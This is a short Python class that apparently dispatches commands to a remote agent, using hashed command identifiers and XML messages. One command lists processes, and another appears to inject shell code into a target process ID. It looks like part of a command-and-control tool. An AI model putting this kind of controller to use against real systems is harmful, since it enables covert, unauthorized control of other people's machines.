from Tools.toolsF import *
import json



class CommandManager(object):

    def __init__(self,writer, reader):
        self.writer = writer
        self.reader = reader
        self.waitingForResult = False
        self.tag = "root"
     
    def retriveCommand(self, message:dict) -> str:
        command = message.get("command")
        self.waitingForResult = command is not None 
        if not self.waitingForResult: 
            return
        if command == "5df297c2f2da83a8b45cfd012fbf9b3c":
            command = gen_xml(self.tag, command=command, type=message.get("type"),web=message.get("web")) 
            self.writer(command.encode())
            return collect(json.loads(self.reader().decode(errors='replace')))
        if command == "be425fd08e9ea24230bac47493228ada": #List process Info
            self.writer(gen_xml(self.tag, command=command).encode())
            return json.loads(self.reader().decode(errors='replace'))
        if command == "aea87b24517d08c8ff13601406a0202e":
            self.writer(gen_xml(self.tag, command=command, shellonbase=message.get("shellonbase"), targetPid=message.get("targetPid")).encode())
            status = str(self.reader().decode(errors='replace').strip())
            print(f"status is ({status})")
            if int(status.strip()) != 0:
                return False
            return True
        command = gen_xml(self.tag, command=command)
        self.writer(command.encode())
        return self.reader().decode(errors='replace')
       
    def isValid(self,*args) -> bool:
        for i in args:
            if i == None:
                return False
        return True
    
    
        
    
    
        

            
